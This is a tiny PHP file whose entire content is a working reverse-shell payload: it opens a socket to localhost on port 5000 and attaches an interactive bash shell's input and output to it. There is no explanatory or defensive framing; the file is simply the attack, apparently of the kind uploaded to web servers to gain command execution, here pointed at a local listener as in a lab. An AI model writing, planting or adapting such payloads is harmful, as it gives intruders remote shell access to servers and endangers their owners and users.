<?php
$s=fsockopen("localhost",5000);
proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$p);
?>